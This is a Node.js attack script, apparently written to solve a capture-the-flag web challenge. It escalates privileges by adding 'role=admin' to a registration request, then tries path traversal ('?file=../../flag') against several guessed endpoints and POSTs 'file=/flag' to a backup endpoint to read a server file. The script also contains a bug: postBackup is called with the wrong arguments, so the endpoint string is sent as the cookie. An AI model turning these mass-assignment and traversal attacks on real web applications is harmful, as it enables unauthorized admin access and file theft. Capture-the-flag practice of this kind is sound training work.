
const http = require('http');
const querystring = require('querystring');

// Directly add role=admin, that's it!
const postData = querystring.stringify({
  "username": "directadmin",
  "role": "admin"
});

const options = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = http.request(options, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log(body);
    let match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      let uid = match[1];
      console.log("\nGot UID:", uid);
      loginAndCheck(uid);
    }
  });
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();

function loginAndCheck(uid) {
  const http = require('http');
  const querystring = require('querystring');

  const postData = querystring.stringify({
    "uid": uid
  });

  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(options, (res) => {
    let setCookie = res.headers['set-cookie'];
    let cookie = setCookie ? setCookie.map(c => c.split(';')[0]).join('; ') : '';
    getPage('/dashboard', cookie, (body) => {
      console.log("\nDashboard:");
      console.log(body);
      // Check if we are admin
      if (body.includes('tag.admin')) {
        console.log("\n✅ Got admin role! Now get backup...");
        // Find the right backup endpoint, let's try all common
        tryAllEndpoints(cookie);
      } else {
        console.log("\n❌ Still not admin");
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function getPage(path, cookie, callback) {
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: path,
    method: 'GET',
    headers: {
      'Cookie': cookie
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => callback(body));
  });
  req.end();
}

function tryAllEndpoints(cookie) {
  const endpoints = [
    '/admin',
    '/backup',
    '/api/backup',
    '/admin/backup',
    '/api/read',
    '/download',
  ];
  
  let done = 0;
  endpoints.forEach(endpoint => {
    getPage(endpoint + '?file=../../flag', cookie, (body) => {
      console.log(`\n--- ${endpoint} ---`);
      console.log(body);
      done++;
      if (done === endpoints.length) {
        // Try POST
        postBackup(endpoint, cookie);
      }
    });
  });
}

function postBackup(cookie) {
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/backup',
    method: 'POST',
    headers: {
      'Cookie': cookie,
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(querystring.stringify({file: '/flag'}))
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\nPOST /api/backup file=/flag:");
      console.log(body);
    });
  });
  req.write(querystring.stringify({file: '/flag'}));
  req.end();
}
